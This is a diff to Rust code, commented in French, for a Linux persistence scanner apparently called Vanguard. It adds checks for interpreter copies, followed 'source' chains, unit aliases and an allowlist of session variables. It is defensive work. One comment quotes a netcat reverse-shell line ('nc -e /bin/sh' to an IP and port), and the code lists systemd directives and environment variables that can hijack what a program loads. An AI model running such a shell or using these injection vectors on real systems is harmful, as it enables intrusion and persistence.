@@ -348,8 +348,24 @@ pub(super) fn persistance_dans(
             .to_string(),
         );
     }
-    let (demarrage, hypr) = fichiers_de_demarrage(racine, maison);
-    let mut configuration = fichiers_de_configuration(racine, maison);
+    // Un dossier personnel qu'on ne peut pas lire : rien n'y serait trouvé, et ce ne serait pas « rien de suspect »
+    // (vérification de la campagne E, N9).
+    if maison.is_absolute()
+        && let Err(e) = std::fs::read_dir(maison)
+        && e.kind() != std::io::ErrorKind::NotFound
+    {
+        t.sources.push(source_de("maison", "illisible"));
+        t.retraits.push(None);
+        t.temoins.push(Err(temoins::Refus(
+            tr!("le dossier personnel ne se lit pas", "the home folder cannot be read").to_string(),
+        )));
+        t.suspects.push(trf!(
+            "le dossier personnel ne se lit pas ({e}) : les démarrages du compte ne sont pas vérifiés",
+            "the home folder cannot be read ({e}): the account's startup files are not checked"
+        ));
+    }
+    let (demarrage, hypr) = fichiers_de_demarrage(&t.r);
+    let mut configuration = fichiers_de_configuration(&t.r);
     let mut sources = configuration.clone();
     sources.extend(hypr.iter().cloned());
     t.r.environnement = Some(environnement(&t.r, sources));
@@ -439,7 +455,12 @@ impl Sorte {
     fn de(f: &Path, r: &Releveur) -> Sorte {
         if f.extension().is_some_and(|x| x == "desktop") {
             Sorte::Bureau
-        } else if f.starts_with(r.maison.join(".config/hypr")) || f.extension().is_some_and(|x| x == "lua") {
+        } else if f.starts_with(r.maison.join(".config/hypr"))
+            || r.config
+                .as_ref()
+                .is_some_and(|c| f.starts_with(r.sous(&c.join("hypr"))))
+            || f.extension().is_some_and(|x| x == "lua")
+        {
             Sorte::Shell
         } else {
             Sorte::Unite {
@@ -475,8 +496,12 @@ fn raison_du_flou(f: designes::Flou) -> &'static str {
             "contains a byte that is not text (UTF-8): what is shown would not be what is started"
         ),
         Flou::Argument => tr!(
-            "donne à son programme un mot qui n'est ni une option ni un chemin absolu : un interpréteur sous un autre nom le lirait comme un script",
-            "gives its program a word that is neither an option nor an absolute path: an interpreter under another name would read it as a script"
+            "donne un mot sans chemin à un programme non reconnu : Vanguard ne peut pas savoir ce qu'il lit",
+            "gives a word without a path to an unrecognized program: Vanguard cannot know what it reads"
+        ),
+        Flou::Processus => tr!(
+            "nomme un chemin par /proc, /dev, « . » ou « .. » : le fichier désigné dépend du programme qui le lit",
+            "names a path through /proc, /dev, “.” or “..”: the file it names depends on the program that reads it"
         ),
         Flou::Relatif => tr!(
             "nomme un chemin relatif, qui dépend du dossier courant",
@@ -510,9 +535,16 @@ fn raison_du_flou(f: designes::Flou) -> &'static str {
     }
 }
 
-/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `Err` : la ligne a la forme d'une porte
-/// dérobée, ne dit pas sans ambiguïté ce qu'elle lance, ou l'un d'eux ne se relève pas.
-fn cibles(r: &mut Releveur, d: Designe, ligne: &str) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
+/// Les fichiers que désigne une ligne (`designes`), relevés sous la racine ; `commande` : une commande lancée, dont le
+/// premier est le programme (sinon, des bibliothèques préchargées). `Err` : la ligne a la forme d'une porte dérobée,
+/// ne dit pas sans ambiguïté ce qu'elle lance, lance une copie d'un interpréteur sous un autre nom, ou l'un d'eux ne
+/// se relève pas.
+fn cibles(
+    r: &mut Releveur,
+    d: Designe,
+    ligne: &str,
+    commande: bool,
+) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
     // Exclue par sa raison, pas par sa syntaxe : « nc -e /bin/sh 192.0.2.7 4444 » se lit sans ambiguïté.
     if raison_grave(ligne).is_some() {
         return Err(temoins::Refus(
@@ -534,13 +566,83 @@ fn cibles(r: &mut Releveur, d: Designe, ligne: &str) -> Result<Vec<(String, temo
             )));
         }
     };
+    if commande && let Some(programme) = chemins.first() {
+        copie_d_un_interprete(r, programme)?;
+    }
     let mut sortie = Vec::with_capacity(chemins.len());
-    for c in chemins {
+    for (i, c) in chemins.into_iter().enumerate() {
         let lu = r.sous(Path::new(&c));
         let montre = r.montre(&lu);
-        sortie.push((montre, temoins::etat_de_la_cible(&lu, &mut r.budget)?));
+        // Seul le programme (ou une bibliothèque préchargée) peut être un binaire : tout autre fichier est lu par un
+        // interpréteur, et doit se montrer comme il s'exécute (vérification de la campagne E, N4).
+        let programme = !commande || i == 0;
+        sortie.push((montre, temoins::etat_de_la_cible(&lu, programme, &mut r.budget)?));
     }
     Ok(sortie)
+}
+
+/// Les dossiers où se trouvent les interpréteurs et les lanceurs du système, à comparer à un programme inconnu.
+const DOSSIERS_DES_INTERPRETES: [&str; 4] = ["/usr/bin", "/bin", "/usr/local/bin", "/usr/sbin"];
+
+/// Un programme qui n'est ni un interpréteur ni un lanceur par son nom, mais dont le contenu est celui d'un
+/// interpréteur ou d'un lanceur du système (une copie ou un lien dur sous un autre nom) : ses options (« -mmodule »,
+/// « -fMakefile ») lui font lire des fichiers que rien ne lie, et la ligne ne se déclare pas. Comparé d'abord par
+/// appareil et numéro, puis par taille, et seulement à taille égale par le contenu (`Err` : c'en est une copie).
+fn copie_d_un_interprete(r: &mut Releveur, programme: &str) -> Result<(), temoins::Refus> {
+    use std::os::unix::fs::MetadataExt as _;
+    if designes::lit_un_script(programme) {
+        return Ok(());
+    }
+    let lu = r.sous(Path::new(programme));
+    let Ok(m) = std::fs::metadata(&lu) else {
+        return Ok(());
+    };
+    if !m.is_file() {
+        return Ok(());
+    }
+    let mut contenu: Option<[u8; 32]> = None;
+    for d in DOSSIERS_DES_INTERPRETES {
+        for e in std::fs::read_dir(r.sous(Path::new(d))).into_iter().flatten().flatten() {
+            let nom = e.file_name();
+            let Some(nom) = nom.to_str() else { continue };
+            if !designes::lit_un_script(nom) {
+                continue;
+            }
+            let Ok(autre) = std::fs::metadata(e.path()) else {
+                continue;
+            };
+            if !autre.is_file() || autre.len() != m.len() {
+                continue;
+            }
+            let copie = (autre.dev() == m.dev() && autre.ino() == m.ino()) || {
+                let soi = match contenu {
+                    Some(c) => Some(c),
+                    None => empreinte_bornee(&lu, &mut r.budget),
+                };
+                contenu = soi;
+                soi.is_some() && soi == empreinte_bornee(&e.path(), &mut r.budget)
+            };
+            if copie {
+                return Err(temoins::Refus(trf!(
+                    "{} est une copie de {} sous un autre nom : ses options lui font lire des fichiers que Vanguard ne suit pas",
+                    "{} is a copy of {} under another name: its options make it read files that Vanguard does not track",
+                    crate::ui::affichable(&r.montre(&lu)),
+                    crate::ui::affichable(&format!("{d}/{nom}"))
+                )));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Le BLAKE3 d'un fichier ordinaire pris sur le budget du bilan ; `None` : illisible ou budget épuisé.
+fn empreinte_bornee(chemin: &Path, budget: &mut temoins::Budget) -> Option<[u8; 32]> {
+    let m = std::fs::metadata(chemin).ok()?;
+    if !budget.prendre(m.len()) {
+        return None;
+    }
+    let lu = temoins::lire_borne(chemin, m.len()).ok()?;
+    lu.entier.then(|| *blake3::hash(&lu.octets).as_bytes())
 }
 
 /// Au-delà de `TEMOINS_MAX` lignes, l'alerte ne se déclare pas : les suivantes ne sont pas relues.
@@ -617,7 +719,9 @@ fn non_lu(f: &Path, h: &Path, t: &mut Lancements, raison: &str) {
 }
 
 /// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `lu` est le contenu ; pour une ligne
-/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`).
+/// d'unité systemd, aussi ce qui change l'unité sans toucher à la ligne (`unite`). `commande` : `designe` vient d'une
+/// commande lancée (sinon, d'un préchargement : `cibles`).
+#[allow(clippy::too_many_arguments)]
 fn temoin_de_ligne(
     t: &mut Lancements,
     fichier: &Path,
@@ -625,6 +729,7 @@ fn temoin_de_ligne(
     lu: &Lecture,
     ligne: &str,
     designe: Designe,
+    commande: bool,
     sorte: Sorte,
 ) -> Result<temoins::Temoin, temoins::Refus> {
     place(t)?;
@@ -638,7 +743,7 @@ fn temoin_de_ligne(
             tr!("le dossier personnel est inconnu", "the home folder is unknown").to_string(),
         ));
     }
-    let mut cibles = cibles(&mut t.r, designe, ligne)?;
+    let mut cibles = cibles(&mut t.r, designe, ligne, commande)?;
     if !lu.entier {
         return Err(temoins::Refus(trf!(
             "{} ne se lit pas en entier",
@@ -660,15 +765,22 @@ fn temoin_de_ligne(
     ))
 }
 
-/// Ce qui se lie de l'environnement des sessions : sous ce nom, les lignes qui nomment une variable sensible.
-const ENVIRONNEMENT: &str = "[env] LD_*, PYTHON*, NODE_*, BASH_ENV, PS4, XDG_CONFIG_HOME…";
+/// Ce qui se lie de l'environnement des sessions : sous ce nom, chaque fichier qui pose des variables, en entier.
+const ENVIRONNEMENT: &str = "[env] profils, environment.d, pam_env, systemd, Hyprland";
 
-/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur, au-delà des profils et
-/// de Hyprland (`sources`) : environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env.
-/// Chaque ligne qui nomme une variable sensible (`variable_sensible`), avec son fichier : une variable posée là après
-/// le choix (BASH_ENV, NODE_OPTIONS, PYTHONPATH…) change ce que fait la ligne acceptée sans toucher à un fichier lié ;
-/// liée ainsi, elle fait revenir l'alerte (campagne E, F4). `Err` : un de ces fichiers ne se lit pas en entier, ou
-/// n'est pas du texte.
+/// Au plus autant de fichiers lus en suivant leurs « source » (au-delà des fichiers connus) : une chaîne plus longue
+/// ne se suit pas.
+const SOURCES_MAX: usize = 64;
+
+/// Les fichiers qui posent des variables pour les sessions et les services de l'utilisateur : les profils et Hyprland
+/// (`sources`), environment.d, les réglages du gestionnaire de systemd (DefaultEnvironment=), pam_env, et chaque
+/// fichier qu'ils lisent par un « source » écrit en toutes lettres. Chacun est lié par l'empreinte de son contenu
+/// entier, une ligne « chemin : sha256 … » par fichier : une variable posée là après le choix (BASH_ENV,
+/// NODE_OPTIONS, un module GTK…) change ce que fait la ligne acceptée sans toucher à un fichier lié ; liée ainsi,
+/// elle fait revenir l'alerte (campagne E, F4). Rien ne se décide par le nom d'une variable : une liste de noms
+/// dangereux se contournait, et une écriture échappée (« \x5f ») aussi (vérification de la campagne E, N3).
+/// `Err` : un de ces fichiers ne se lit pas en entier, ou un « source » de Hyprland ne dit pas en toutes lettres
+/// ce qu'il lit.
 fn environnement(
     r: &Releveur,
     mut sources: Vec<std::path::PathBuf>,
@@ -700,10 +812,19 @@ fn environnement(
     }
     sources.sort();
     sources.dedup();
-    let mut lignes = String::new();
-    for f in &sources {
-        let montre = || crate::ui::affichable(&r.montre(f));
-        let lu = match temoins::lire_borne(f, LECTURE_MAX) {
+    let connus = sources.len();
+    let mut lus: Vec<(String, String)> = Vec::new();
+    let mut rang = 0usize;
+    while let Some(f) = sources.get(rang).cloned() {
+        rang = rang.saturating_add(1);
+        if rang > connus.saturating_add(SOURCES_MAX) {
+            return Err(temoins::Refus(trf!(
+                "les fichiers des variables des sessions en lisent plus de {SOURCES_MAX} autres : la chaîne ne se suit pas",
+                "the session variable files read more than {SOURCES_MAX} others: the chain cannot be followed"
+            )));
+        }
+        let montre = || crate::ui::affichable(&r.montre(&f));
+        let lu = match temoins::lire_borne(&f, LECTURE_MAX) {
             Ok(lu) => lu,
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
             Err(e) => {
@@ -724,27 +845,96 @@ fn environnement(
         let (Ok(texte), Some(_)) = (std::str::from_utf8(&lu.octets), f.to_str()) else {
             return Err(octet_refuse(&montre()));
         };
-        for l in texte.lines() {
-            // Un commentaire (« # » en tête, partout dans ces formats) ne pose rien ; sauf s'il finit par « \ » : une
-            // ligne continuée selon le lecteur, gardée.
-            let net = l.trim_matches([' ', '\t']);
-            if net.starts_with('#') && !net.ends_with('\\') {
-                continue;
-            }
-            let nomme = l.split(|c: char| !(c.is_ascii_alphanumeric() || c == '_')).any(|mot| {
-                mot.bytes().any(|b| b.is_ascii_uppercase())
-                    && !mot.bytes().any(|b| b.is_ascii_lowercase())
-                    && variable_sensible(mot)
-            });
-            if nomme {
-                lignes.push_str(&r.montre(f));
-                lignes.push_str(": ");
-                lignes.push_str(l.trim_matches([' ', '\t']));
-                lignes.push('\n');
+        lus.push((r.montre(&f), temoins::sha256_de(&lu.octets)));
+        let hypr = f.components().any(|c| c.as_os_str() == "hypr");
+        for suivi in sources_lues(r, texte, hypr, &montre())? {
+            if !sources.contains(&suivi) {
+                sources.push(suivi);
             }
         }
     }
+    lus.sort();
+    lus.dedup();
+    let mut lignes = String::new();
+    for (chemin, etat) in &lus {
+        lignes.push_str(chemin);
+        lignes.push_str(" : ");
+        lignes.push_str(etat);
+        lignes.push('\n');
+    }
     Ok((ENVIRONNEMENT.to_string(), temoins::Etat::du_texte(lignes.as_bytes())))
+}
+
+/// Les fichiers qu'un fichier des variables lit à son tour, écrits en toutes lettres : « source = … » de Hyprland
+/// (`hypr`), « source … » ou « . … » d'un shell, en tête de ligne, par un chemin absolu ou sous « ~/ », « $HOME/ ».
+/// Refusé : un « source = » de Hyprland calculé (variable, joker, chemin relatif), qui lirait on ne sait quoi.
+/// Un « source » de shell calculé (« $DOSSIER/x », une boucle) ne se suit pas : c'est une limite écrite (le contenu
+/// du profil qui l'écrit reste lié). `montre` : le fichier lu, tel qu'il se montre.
+fn sources_lues(
+    r: &Releveur,
+    texte: &str,
+    hypr: bool,
+    montre: &str,
+) -> Result<Vec<std::path::PathBuf>, temoins::Refus> {
+    let maison = |reste: &str| r.maison.join(reste);
+    let calcule = |l: &str| {
+        temoins::Refus(trf!(
+            "{montre} lit « {} », un fichier qui ne se dit pas en toutes lettres : les variables des sessions ne se vérifient pas",
+            "{montre} reads “{}”, a file that is not spelled out: the session variables cannot be checked",
+            crate::ui::couper(&crate::ui::affichable(l), 80)
+        ))
+    };
+    let mut suivis = Vec::new();
+    for l in texte.lines() {
+        let net = l.trim_matches([' ', '\t']);
+        if hypr
+            && let Some(v) = net
+                .strip_prefix("source")
+                .map(|v| v.trim_start_matches([' ', '\t']))
+                .and_then(|v| v.strip_prefix('='))
+        {
+            let v = v.split('#').next().unwrap_or_default().trim_matches([' ', '\t']);
+            let chemin = if let Some(reste) = v.strip_prefix("~/") {
+                maison(reste)
+            } else if v.starts_with('/') {
+                r.sous(Path::new(v))
+            } else {
+                return Err(calcule(l));
+            };
+            if v.contains(['$', '*', '?', '[', '{', '`']) {
+                return Err(calcule(l));
+            }
+            suivis.push(chemin);
+            continue;
+        }
+        let Some(reste) = net
+            .strip_prefix("source ")
+            .or_else(|| net.strip_prefix("source\t"))
+            .or_else(|| net.strip_prefix(". "))
+            .or_else(|| net.strip_prefix(".\t"))
+        else {
+            continue;
+        };
+        let mot = reste.trim_start_matches([' ', '\t']);
+        let mot = mot.split([' ', '\t', ';', '&', '|']).next().unwrap_or_default();
+        let mot = mot.trim_matches(['"', '\'']);
+        let chemin = if let Some(r_) = mot
+            .strip_prefix("~/")
+            .or_else(|| mot.strip_prefix("$HOME/"))
+            .or_else(|| mot.strip_prefix("${HOME}/"))
+        {
+            maison(r_)
+        } else if mot.starts_with('/') {
+            r.sous(Path::new(mot))
+        } else {
+            continue;
+        };
+        let suite = chemin.to_string_lossy();
+        if !suite.contains(['$', '`', '*', '?', '[', '{', '"', '\'']) {
+            suivis.push(chemin);
+        }
+    }
+    Ok(suivis)
 }
 
 /// L'environnement relevé (`environnement`), à lier à une ligne ; son refus sinon.
@@ -774,8 +964,8 @@ const AJOUTS_MAX: usize = 32;
 const AJOUT_MAX: u64 = 1024 * 1024;
 
 /// Directives d'une unité qui changent ce qu'elle lance ou charge sans toucher à la ligne acceptée : variables lues
-/// ailleurs, dossier de recherche des programmes, racine ou dossiers montés à la place des vrais.
-const DIRECTIVES_REFUSEES: [&str; 12] = [
+/// ailleurs, dossier de recherche des programmes, dossier de travail, racine ou dossiers montés à la place des vrais.
+const DIRECTIVES_REFUSEES: [&str; 16] = [
     "EnvironmentFile",
     // L'entrée standard prise d'un fichier ou d'un texte : un interpréteur sous un autre nom la lirait comme son
     // script, jamais lié (campagne E, F2).
@@ -783,8 +973,14 @@ const DIRECTIVES_REFUSEES: [&str; 12] = [
     "StandardInputText",
     "StandardInputData",
     "ExecSearchPath",
+    // Le dossier de travail : « /proc/self/cwd/… » ou un chemin relatif lu par le programme s'y résolvent, ailleurs
+    // que là où Vanguard lit (vérification de la campagne E, N1).
+    "WorkingDirectory",
     "RootDirectory",
     "RootImage",
+    "RootEphemeral",
+    "RootDirectoryStartOnly",
+    "TemporaryFileSystem",
     "BindPaths",
     "BindReadOnlyPaths",
     "MountImages",
@@ -792,59 +988,65 @@ const DIRECTIVES_REFUSEES: [&str; 12] = [
     "ExtensionDirectories",
 ];
 
-/// Une variable qui change ce que charge un programme ou un interpréteur, ou où il cherche : bibliothèques, modules,
-/// dossier personnel (« ${HOME}/x » d'une ligne), PATH, fichier lu au démarrage d'un shell.
-fn variable_sensible(nom: &str) -> bool {
-    const DEBUTS: [&str; 24] = [
-        "LD_",
-        "QT_",
-        "GIO_",
-        "GST_PLUGIN",
-        "OPENSSL_",
-        "TCL",
-        "GTK_PATH",
-        "PYTHON",
-        "NODE_",
-        "PERL",
-        "RUBY",
-        "GEM_",
-        "BUNDLE_",
-        "DENO_",
-        "BUN_",
-        "LUA_",
-        "PHP",
-        "JAVA_",
-        "_JAVA_",
-        "JDK_JAVA_",
-        "CLASSPATH",
-        "GCONV_",
-        "GTK_MODULES",
-        "MALLOC_",
+/// Les seules variables qu'« Environment= » et « PassEnvironment= » peuvent poser dans une unité qui se déclare
+/// normale : l'écran, la langue, le fuseau, le terminal. Aucune ne fait charger du code ni ne change où un programme
+/// le cherche. Décider par une liste de ce qui est dangereux se contournait (modules GTK, pilotes GL, BASH_FUNC_…,
+/// vérification de la campagne E) : on décide par ce qui est sûr.
+fn variable_permise(nom: &str) -> bool {
+    const NOMS: [&str; 12] = [
+        "DISPLAY",
+        "WAYLAND_DISPLAY",
+        "LANG",
+        "LANGUAGE",
+        "TZ",
+        "TERM",
+        "COLORTERM",
+        "NO_COLOR",
+        "XDG_SESSION_TYPE",
+        "XDG_CURRENT_DESKTOP",
+        "XDG_SESSION_DESKTOP",
+        "DESKTOP_SESSION",
     ];
-    const NOMS: [&str; 16] = [
-        "HOME",
-        "PATH",
-        "ENV",
-        "BASH_ENV",
-        "ZDOTDIR",
-        "SHELLOPTS",
-        "BASHOPTS",
-        "IFS",
-        "PS4",
-        "PROMPT_COMMAND",
-        "GTK_EXE_PREFIX",
-        "XDG_CONFIG_HOME",
-        "XDG_CONFIG_DIRS",
-        "XDG_DATA_HOME",
-        "XDG_DATA_DIRS",
-        "SSL_CERT_FILE",
-    ];
-    let n = nom.to_ascii_uppercase();
-    DEBUTS.iter().any(|d| n.starts_with(d)) || NOMS.contains(&n.as_str())
+    NOMS.contains(&nom)
+        || nom
+            .strip_prefix("LC_")
+            .is_some_and(|r| !r.is_empty() && r.bytes().all(|b| b.is_ascii_uppercase()))
+}
+
+/// Les mots d'une valeur de systemd (« Environment= »), coupés sur l'espace et la tabulation hors guillemets,
+/// guillemets retirés ; `None` : un échappement (« \ »), que systemd décode (« \x5f » est « _ ») avant de lire le nom
+/// (vérification de la campagne E, N3), ou un guillemet non fermé.
+fn mots_de_systemd(valeur: &str) -> Option<Vec<String>> {
+    if valeur.contains('\\') {
+        return None;
+    }
+    let mut mots = Vec::new();
+    let mut mot = String::new();
+    let mut dans: Option<char> = None;
+    for c in valeur.chars() {
+        match (dans, c) {
+            (Some(q), c) if c == q => dans = None,
+            (None, '"' | '\'') => dans = Some(c),
+            (None, ' ' | '\t') => {
+                if !mot.is_empty() {
+                    mots.push(std::mem::take(&mut mot));
+                }
+            }
+            (_, c) => mot.push(c),
+        }
+    }
+    if dans.is_some() {
+        return None;
+    }
+    if !mot.is_empty() {
+        mots.push(mot);
+    }
+    Some(mots)
 }
 
 /// La première directive d'une unité ou d'un ajout qui change ce qu'elle lance sans toucher à la ligne acceptée
-/// (`DIRECTIVES_REFUSEES`, une variable sensible dans « Environment= » ou « PassEnvironment= »), telle qu'à montrer.
+/// (`DIRECTIVES_REFUSEES`, une variable hors de `variable_permise` dans « Environment= » ou « PassEnvironment= »),
+/// telle qu'à montrer.
 /// Les lignes continuées par « \ » sont jointes comme les joint systemd (un commentaire au milieu est sauté).
 fn directive_refusee(texte: &str) -> Option<String> {
     let mut logiques: Vec<String> = Vec::new();
@@ -877,9 +1079,12 @@ fn directive_refusee(texte: &str) -> Option<String> {
             return Some(cle.to_string());
         }
         if cle == "Environment" || cle == "PassEnvironment" {
-            for mot in valeur.split([' ', '\t', '"', '\'']).filter(|m| !m.is_empty()) {
-                let nom = mot.split('=').next().unwrap_or(mot);
-                if variable_sensible(nom) {
+            let Some(mots) = mots_de_systemd(valeur) else {
+                return Some(format!("{cle}=\\…"));
+            };
+            for mot in mots {
+                let nom = mot.split('=').next().unwrap_or(&mot);
+                if !variable_permise(nom) {
                     return Some(format!("{cle}={}", crate::ui::affichable(nom)));
                 }
             }
@@ -980,7 +1185,7 @@ fn lire_ajout(r: &Releveur, f: &Path) -> Result<temoins::Etat, temoins::Refus> {
             vers: "/dev/null".into(),
             puis: Box::new(temoins::Etat::Absent),
             vu: std::fs::symlink_metadata(f)
-                .map(|m| temoins::Vu::de(&m))
+                .map(|m| temoins::Vu::de_dans(&m, f))
                 .unwrap_or_default(),
         });
     }
@@ -1009,6 +1214,80 @@ fn lire_ajout(r: &Releveur, f: &Path) -> Result<temoins::Etat, temoins::Refus> {
         return Err(refus_directive(&montre(), &d));
     }
     temoins::etat_du_contenant(f, &lu.octets)
+}
+
+/// Au plus autant de noms pour une unité (elle et ses alias) : au-delà, la chaîne est trop longue pour se suivre.
+const ALIAS_MAX: usize = 32;
+
+/// L'unité `nom` et chacun de ses alias, jusqu'au bout : un lien d'un dossier d'unités vers elle sous un autre nom,
+/// ou vers un de ses alias (« alias2 -> alias -> rappel ») ; systemd applique aussi les ajouts posés sous chacun de
+/// ces noms, jusque dans le dossier de la session (campagne E, F5 ; vérification, N6). `vraie` : le fichier de
+/// l'unité que systemd lance. `Err` : un nom qui n'est pas de l'UTF-8, un lien qui boucle, ou trop d'alias.
+fn alias_de(
+    r: &Releveur,
+    dossiers: &[std::path::PathBuf],
+    nom: &str,
+    vraie: Option<&Path>,
+) -> Result<Vec<String>, temoins::Refus> {
+    let vraie = vraie.and_then(|f| std::fs::canonicalize(f).ok());
+    // Chaque lien des dossiers d'unités : son nom, son chemin, le nom vers lequel il mène.
+    let mut liens: Vec<(String, std::path::PathBuf, Option<std::ffi::OsString>)> = Vec::new();
+    for d in dossiers {
+        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
+            let n = e.file_name();
+            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
+            let Some(n) = n.to_str() else {
+                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
+            };
+            let Ok(vers) = std::fs::read_link(e.path()) else {
+                continue;
+            };
+            liens.push((
+                n.to_string(),
+                e.path(),
+                vers.file_name().map(std::ffi::OsStr::to_os_string),
+            ));
+        }
+    }
+    let mut noms = vec![nom.to_string()];
+    // Jusqu'au point fixe : chaque tour ajoute au moins un nom, ou s'arrête ; au plus un tour par lien.
+    loop {
+        let mut ajoute = false;
+        for (n, chemin, vers) in &liens {
+            if noms.contains(n) {
+                continue;
+            }
+            let meme_nom = vers
+                .as_ref()
+                .and_then(|v| v.to_str())
+                .is_some_and(|v| noms.iter().any(|x| x == v));
+            let meme_fichier = match (&vraie, std::fs::canonicalize(chemin)) {
+                (_, Err(e)) if e.raw_os_error() == Some(libc::ELOOP) => {
+                    return Err(temoins::Refus(trf!(
+                        "{} est un lien qui boucle",
+                        "{} is a link that loops",
+                        crate::ui::affichable(&r.montre(chemin))
+                    )));
+                }
+                (Some(v), Ok(c)) => c == *v,
+                _ => false,
+            };
+            if meme_nom || meme_fichier {
+                if noms.len() >= ALIAS_MAX {
+                    return Err(temoins::Refus(trf!(
+                        "{} a plus de {ALIAS_MAX} alias : la chaîne est trop longue pour se suivre",
+                        "{} has more than {ALIAS_MAX} aliases: the chain is too long to follow",
+                        crate::ui::affichable(nom)
+                    )));
+                }
+                noms.push(n.clone());
+                ajoute = true;
+            }
+        }
+        if !ajoute {
+            return Ok(noms);
+        }
+    }
 }
 
 fn refus_directive(fichier: &str, directive: &str) -> temoins::Refus {
@@ -1063,33 +1342,9 @@ fn unite(
         let f = d.join(&nom);
         lies.push((r.montre(&f), lire_ajout(r, &f)?));
     }
-    let mut noms = ajouts_de(&nom);
-    // Les alias de l'unité (un lien d'un dossier d'unités vers elle, sous un autre nom) : systemd applique aussi les
-    // ajouts posés sous leur nom, jusque dans le dossier de la session (campagne E, F5).
-    let vraie = premiere
-        .map(|d| d.join(&nom))
-        .and_then(|f| std::fs::canonicalize(f).ok());
-    for d in &dossiers {
-        for e in std::fs::read_dir(d).into_iter().flatten().flatten() {
-            let n = e.file_name();
-            // Un nom qui n'est pas de l'UTF-8 ne se compare pas : un alias ainsi nommé échapperait (F1).
-            let Some(n) = n.to_str() else {
-                return Err(octet_refuse(&crate::ui::affichable(&r.montre(&e.path()))));
-            };
-            if n == nom {
-                continue;
-            }
-            let Ok(vers) = std::fs::read_link(e.path()) else {
-                continue;
-            };
-            let meme_nom = vers.file_name().is_some_and(|v| v == std::ffi::OsStr::new(&nom));
-            let meme_fichier = vraie
-                .as_ref()
-                .is_some_and(|v| std::fs::canonicalize(e.path()).is_ok_and(|c| c == *v));
-            if meme_nom || meme_fichier {
-                noms.extend(ajouts_de(n));
-            }
-        }
+    let mut noms = Vec::new();
+    for n in alias_de(r, &dossiers, &nom, premiere.map(|d| d.join(&nom)).as_deref())? {
+        noms.extend(ajouts_de(&n));
     }
     noms.sort();
     noms.dedup();
@@ -1193,7 +1448,7 @@ fn lire_prechargement(
             t.sources.push(source_de("preload", lib));
             t.retraits.push(retrait(&preload, &lu.texte, ligne));
             let d = designes::bibliotheques(lib, designes::Liste::Fichier);
-            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, Sorte::Shell);
+            let temoin = temoin_de_ligne(t, &preload, n, &lu, ligne, d, false, Sorte::Shell);
             t.temoins.push(temoin);
             // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
             let lib = crate::ui::affichable(lib);
@@ -1216,7 +1471,7 @@ fn lire_prechargement(
             t.sources.push(source_de(&format!("env:{var}"), &valeur));
             t.retraits.push(None);
             let d = designes::bibliotheques(&valeur, designes::Liste::Variable);
-            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, &valeur)).map(|c| {
+            let temoin = place(t).and_then(|()| cibles(&mut t.r, d, &valeur, false)).map(|c| {
                 temoins::temoin(
                     &format!("env:{var}"),
                     trf!("{var} de cette session", "{var} of this session"),
@@ -1236,33 +1491,47 @@ fn lire_prechargement(
 }
 
 /// Les fichiers de configuration des sessions (environnement, profils des shells, uwsm), du système puis du compte.
-fn fichiers_de_configuration(racine: &Path, h: &Path) -> Vec<std::path::PathBuf> {
-    let etc = |chemin: &str| racine.join(chemin);
+fn fichiers_de_configuration(r: &Releveur) -> Vec<std::path::PathBuf> {
+    let h = &r.maison;
+    let etc = |chemin: &str| r.racine.join(chemin);
     let mut configuration: Vec<std::path::PathBuf> = [
         "etc/environment",
         "etc/profile",
         "etc/bash.bashrc",
         "etc/zsh/zshenv",
         "etc/zsh/zprofile",
+        "etc/zsh/zshrc",
+        "etc/zsh/zlogin",
+        "etc/fish/config.fish",
     ]
     .iter()
     .map(|c| etc(c))
     .collect();
     configuration.extend(fichiers_de(&etc("etc/profile.d"), &["sh", "zsh"]));
     configuration.extend(fichiers_de(&etc("etc/environment.d"), &["conf"]));
+    configuration.extend(fichiers_de(&etc("etc/fish/conf.d"), &["fish"]));
+    // ~/.bash_login, ~/.zlogin et fish aussi (vérification de la campagne E) : chacun lit du code à l'ouverture.
     configuration.extend(
         [
             ".profile",
             ".bash_profile",
+            ".bash_login",
             ".bashrc",
             ".zshrc",
             ".zshenv",
             ".zprofile",
+            ".zlogin",
             ".xprofile",
+            ".config/fish/config.fish",
         ]
         .iter()
         .map(|f| h.join(f)),
     );
+    configuration.extend(fichiers_de(&h.join(".config/fish/conf.d"), &["fish"]));
+    if let Some(c) = &r.config {
+        configuration.push(r.sous(&c.join("fish/config.fish")));
+        configuration.extend(fichiers_de(&r.sous(&c.join("fish/conf.d")), &["fish"]));
+    }
     configuration.extend(fichiers_de(&h.join(".config/environment.d"), &["conf"]));
     configuration.extend(fichiers_de(&h.join(".config/uwsm"), &["sh", "conf"]));
     for f in std::fs::read_dir(h.join(".config/uwsm"))
@@ -1279,9 +1548,10 @@ fn fichiers_de_configuration(racine: &Path, h: &Path) -> Vec<std::path::PathBuf>
 
 /// Les fichiers dont des lignes lancent des programmes (services, démarrage de session, Hyprland), et ceux de
 /// Hyprland à part : ils sont aussi des fichiers de configuration.
-fn fichiers_de_demarrage(racine: &Path, h: &Path) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
+fn fichiers_de_demarrage(r: &Releveur) -> (Vec<std::path::PathBuf>, Vec<std::path::PathBuf>) {
     const UNITES: [&str; 5] = ["service", "timer", "socket", "path", "conf"];
-    let etc = |chemin: &str| racine.join(chemin);
+    let h = &r.maison;
+    let etc = |chemin: &str| r.racine.join(chemin);
     let mut demarrage = Vec::new();
     // Les dossiers d'unités du système et des comptes : les liens y sont des alias ou des activations, vers des
     // unités lues ailleurs.
@@ -1300,7 +1570,19 @@ fn fichiers_de_demarrage(racine: &Path, h: &Path) -> (Vec<std::path::PathBuf>, V
     }
     demarrage.extend(fichiers_de(&h.join(".config/autostart"), &["desktop"]));
